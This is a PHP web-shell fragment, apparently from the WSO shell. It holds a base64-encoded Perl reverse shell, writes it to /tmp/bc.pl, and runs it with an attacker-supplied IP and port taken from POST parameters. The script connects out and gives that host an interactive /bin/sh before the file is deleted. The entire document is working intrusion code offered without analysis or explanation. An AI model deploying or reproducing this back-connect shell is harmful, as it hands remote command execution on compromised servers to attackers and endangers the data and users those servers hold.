<?php
function cf($f,$t) {
    $w = @fopen($f,"w") or @function_exists('file_put_contents');
    if($w){
        @fwrite($w,@base64_decode($t));
        @fclose($w);
    }
}

function wsoEx($in) {
    $out = '';
    
    @exec($in,$out);
    $out = @join("\n",$out);
    return $out;
}
$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";


cf("/tmp/bc.pl",$back_connect_p);
$out = wsoEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre class=ml1>$out\n".wsoEx("ps aux | grep bc.pl")."</pre>";
unlink("/tmp/bc.pl");
?>